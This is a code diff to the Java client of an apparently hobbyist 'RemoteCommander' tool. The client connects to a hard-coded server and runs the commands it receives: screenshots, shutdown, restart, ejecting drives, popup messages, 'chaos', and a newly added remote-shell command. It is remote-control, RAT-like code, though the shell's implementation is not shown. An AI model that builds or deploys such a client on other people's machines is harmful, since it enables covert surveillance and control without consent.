@@ -5,9 +5,7 @@ import static com.github.connorf.RemoteCommander.CommandConstants.*;
 import java.awt.*;
 import java.io.*;
 import java.net.Socket;
-import java.net.URI;
 import java.nio.file.Files;
-import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardCopyOption;
 
@@ -57,8 +55,11 @@ public class Client
      */
     private void connectAndListen() throws IOException, AWTException, UnknownOperatingSystemException
     {
-        socket = new Socket(SERVER_IP_ADDRESS, SERVER_PORT);
-        commandSet = setCommandSet(socket);
+        if(socket == null)
+        {
+            socket = new Socket(SERVER_IP_ADDRESS, SERVER_PORT);
+            commandSet = setCommandSet(socket);
+        }
 
         while(socket.isConnected())
         {
@@ -81,39 +82,42 @@ public class Client
      *
      * @param serverCommand the command from the server and optionally extra arguments (msg command for example provides a msg arg)
      */
-    private void processServerCommand(String... serverCommand) throws IOException, AWTException
+    private void processServerCommand(String... serverCommand) throws IOException, AWTException, UnknownOperatingSystemException
     {
         switch(serverCommand[0].toLowerCase())
         {
+            case CMD_REMOTE_SHELL:
+                commandSet.remoteShell();
+                break;
             case CMD_EJECT:
 //                if(commandSet.eject())
 //                    commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Success: " + CMD_EJECT);
 //                else
 //                    commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Failure: " + CMD_EJECT);
                 commandSet.eject();
-                return;
+                break;
             case CMD_WALLPAPER:
                 processWallpaperCommand(serverCommand[1], serverCommand[2]);
                 break;
             case CMD_SOUND: // special case: sound requires the sound file from the server so we must retrieve it
                 processSoundCommand(serverCommand[1], serverCommand[2]);
-                return;
+                break;
             case CMD_SCREENSHOT:
 //                if(commandSet.takeScreenshot())
 //                    commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Success: " + CMD_SCREENSHOT);
 //                else
 //                    commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Failure: " + CMD_SCREENSHOT);
                 commandSet.takeScreenshot();
-                return;
+                break;
             case CMD_MSG:
                 commandSet.showMessage(serverCommand[1], serverCommand[2], serverCommand[3]);
-                return;
+                break;
             case CMD_SHUTDOWN:
                 commandSet.shutdown();
-                return;
+                break;
             case CMD_RESTART:
                 commandSet.restart();
-                return;
+                break;
             case CMD_CHAOS:
                 commandSet.chaos(Long.valueOf(serverCommand[1]), Long.valueOf(serverCommand[2]));
                 break;
